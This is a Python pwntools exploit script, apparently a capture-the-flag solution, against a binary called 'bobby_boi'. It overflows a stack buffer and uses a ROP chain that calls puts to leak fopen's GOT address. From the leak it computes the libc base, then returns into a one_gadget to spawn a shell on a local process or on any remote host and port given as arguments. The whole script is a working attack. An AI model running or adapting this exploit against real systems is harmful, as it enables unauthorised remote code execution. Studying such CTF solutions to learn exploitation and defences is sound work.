#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './bobby_boi'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc6_2.23-0ubuntu11.2_amd64.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
main = 0x000000000040134B
# gadget
prdi = 0x000000000040140b # pop rdi ; ret

payload = 'A'*36+'-V1p3R_$'
sla('What\'s the size of your bars?\n',str(len(payload)))
sea('Spit your bars here: \n',payload)
debug()
payload += cyclic(12)
payload += p64(prdi) + p64(elf.got['fopen'])
payload += p64(elf.sym['puts'])
payload += p64(main)
sl(payload)

fopen = uu64(rc(6))
libcbase = fopen - libc.sym['fopen']
info_addr('libcbase')

og = [283174,283258,983908,987655]

payload = 'A'*36+'-V1p3R_$'
sla('What\'s the size of your bars?\n',str(len(payload)))
sea('Spit your bars here: \n',payload)
payload += cyclic(12)
payload += p64(libcbase+og[0])
sl(payload)

p.interactive()